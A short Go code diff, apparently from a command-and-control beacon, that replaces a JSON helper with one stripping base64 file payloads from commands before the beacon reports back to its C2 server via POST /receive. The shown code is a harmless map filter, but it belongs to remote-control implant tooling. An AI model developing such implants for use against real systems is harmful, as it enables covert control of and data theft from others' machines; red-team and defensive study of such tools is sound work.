@@ -128,8 +128,20 @@ func handleHTTPFileCommandMap(m map[string]interface{}) (output string, err erro
 	}
 }
 
-func commandMapToString(m map[string]interface{}) string {
-	b, err := json.Marshal(m)
+// summarizeHTTPFileCommandForReceive returns JSON for POST /receive "command" without file payloads
+// (e.g. content_base64), so the beacon does not echo multi‑megabyte base64 back to the C2.
+func summarizeHTTPFileCommandForReceive(m map[string]interface{}) string {
+	if m == nil {
+		return "{}"
+	}
+	clone := make(map[string]interface{}, len(m))
+	for k, v := range m {
+		if k == "content_base64" || k == "contentBase64" {
+			continue
+		}
+		clone[k] = v
+	}
+	b, err := json.Marshal(clone)
 	if err != nil {
 		return fmt.Sprintf("%v", m)
 	}
